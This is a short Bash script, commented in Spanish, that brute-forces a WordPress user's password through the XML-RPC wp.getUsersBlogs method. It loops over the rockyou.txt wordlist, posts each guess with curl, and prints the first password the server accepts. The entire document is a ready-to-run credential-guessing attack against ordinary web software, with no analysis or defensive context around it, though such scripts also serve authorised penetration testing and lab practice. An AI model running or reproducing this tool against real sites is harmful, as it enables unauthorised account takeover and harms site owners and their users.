#!/bin/bash

# Funcion para el Control_c
function ctrl_c(){
    echo -e "\n\n [!] Saliendo...\n"
    exit 1
}

# ctrl_c
trap ctrl_c SIGINT

# Validar la cantidad de argumentos
if [ $# -ne 2 ]; then
    echo "Error: Se requieren 2 argumentos."
    echo "Uso: $0 USER URL"
    exit 1
fi

# Esta funcion sirve para crear el archivo xml y realizar la peticion para el ataque de fuerza bruta
function createXML(){
    # Variables
    password=$1
    user=$2
    url=$3
    # Archivo xml
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$user</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
    """

    # Hacemos la peticion con culr pasandole el archivo xml
    echo $xmlFile > file.xml
    # Almacenamos la respuesta en una variable para posteriormente printear la contraseña cuando sea valida
    response=$(curl -s -X POST $url -d@file.xml)
    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
        echo -e "La contraseña para el usuario \e[32m$user\e[0m es: \e[32m$password\e[0m"
        exit 0
    fi
}

user=$1
url=$2
# Leemos el diccionario y hacemos el condicional llamando a la funcion
cat /usr/share/wordlists/rockyou.txt | while read password; do
    createXML $password $user $url
done
